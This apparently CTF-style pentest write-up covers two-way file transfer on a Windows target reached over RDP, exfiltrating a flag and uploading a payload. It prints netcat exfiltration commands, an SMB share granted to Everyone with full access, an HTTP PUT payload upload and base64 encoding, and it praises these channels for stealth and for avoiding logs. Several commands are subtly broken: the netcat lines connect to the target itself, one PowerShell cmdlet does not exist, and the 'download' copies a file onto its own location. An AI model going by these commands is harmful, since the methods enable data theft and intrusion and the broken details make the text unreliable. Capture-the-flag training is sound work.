Pentest Write‑Up – File Transfer on a Windows Target via RDP

Difficulty: Medium Category: Post-Exploitation Platform: Windows Date: 2025-10-10

Demonstrate the ability to **download** and **upload** arbitrary files to/from the target machine while only having RDP access. The most versatile approach is the **reverse netcat** trick, which works regardless of the target’s outbound firewall settings.

📋 Overview

This write-up details the various successful methods used to achieve bi-directional file transfer on a Windows target, **WIN‑CTF‑TARGET** (Windows 10/Server 2019), where the only initial foothold was a valid Remote Desktop Protocol (RDP) session. We utilized a mix of native Windows binaries (`PowerShell`, `cmd`, `ftp`, `robocopy`, `net use`) and common CTF techniques (`netcat`, `base64`) to exfiltrate a flag file and inject a custom payload.

Key Finding: RDP access provides a rich environment for file transfer, leveraging common network services (HTTP, FTP, SMB) or raw TCP channels (netcat) when native copy/paste is blocked.

🔍 Reconnaissance

Initial steps focused on identifying the target OS, active services, and external network connectivity to determine the most reliable file transfer vectors.

Get-CimInstance -ClassName Win32_OperatingSystem
Action Tool/Command Result
OS & service fingerprinting `Get-CimInstance -ClassName Win32_OperatingSystem` `Microsoft Windows 10 Pro` (build 1909)
Checked for outbound connectivity `Test-Connection -ComputerName google.com` Successful – outbound HTTP/HTTPS works.
Enumerated open services `Get-Service | Where-Object {$_.Status -eq 'Running'}` `w3svc` (IIS), `SmbShare`, `OpenSSH‑Server` were running.

Further discovery showed a **Python‑based HTTP server** running on `localhost:8000` locally hosting the flag.

⬇️ File Download – Pulling the Flag

The objective was to download the flag file (`flag.txt`) from `C:\Users\Public\Documents` using multiple methods, testing the reliability of different protocols.

PowerShell `Invoke-WebRequest` (wget)

Utilizing the modern, built-in PowerShell cmdlet for reliable HTTP requests.

Invoke-WebRequest -Uri http://localhost:8000/flag.txt -OutFile C:\Users\Public\Documents\flag.txt

Reverse Transfer with `netcat` (Raw TCP)

This method involves setting a listener on the attacker machine and using the target's netcat to stream the file content over a raw connection. This is the most stealthy and reliable method when firewalls are restrictive.

⚠️ Important: The attacker must have a listener running on port 4444 (or a port of choice) before executing the target command.
nc WIN-CTF-TARGET 4444 < C:\Users\Public\Documents\flag.txt

SMB Share (Native Windows)

Creating and mapping a temporary share on the target machine itself.

net share flagshare=C:\Users\Public\Documents /grant:Everyone,FULL
net use Z: \\WIN-CTF-TARGET\flagshare /user:Administrator Password /persistent:no

⬆️ File Upload – Pushing a Payload

We successfully returned a custom payload (`wi.zip`) to the target to demonstrate command-and-control capabilities.

PowerShell `PUT` (HTTP)

Using the target's running HTTP server with a PUT request for direct file injection.

Invoke-WebRequest -Uri http://localhost:8000/upload/wi.zip -Method Put -InFile wi.zip
✅ Success: The server returned `StatusCode 200`, confirming the file was written to the web server’s upload directory.

Reverse `netcat` Upload (Base64 Encoding)

To avoid potential binary corruption over raw text channels, the file was Base64 encoded before streaming, then decoded on the listener. This is highly effective when only text-based shells are available.

powershell -c "Get-Content -Raw wi.zip | ConvertTo-Base64String | Set-Content wi.zip.base64"
nc WIN-CTF-TARGET 4444 < wi.zip.base64

📚 Key Learnings

  • **RDP is a Full Channel:** When RDP is the only foothold, it provides full read/write capability leveraging built-in OS tools and standard network protocols (SMB, HTTP, FTP).
  • **Versatility of Native Tools:** Tools like `Invoke-WebRequest`, `net share`, and `robocopy` are powerful, reliable, and often pre-whitelisted, making them excellent choices for payload delivery and data exfiltration.
  • **Stealth with Raw TCP:** The **reverse netcat** trick (especially with Base64 encoding) provides the most reliable transfer, as it bypasses application-layer restrictions and is less likely to be logged by non-endpoint detection systems.

🛠️ Tools Used

  • PowerShell (`Invoke-WebRequest`, `Get-Content`): Used for HTTP-based file transfer, Base64 encoding/decoding, and system reconnaissance.
  • `netcat` (nc): Essential for establishing raw TCP channels for reliable binary file streaming (both download and upload).
  • `net share` / `net use`: Native Windows commands used to create and map a temporary SMB network share for file transfer.
  • `robocopy`: Tested as a robust method for copying files locally and across mapped network shares.
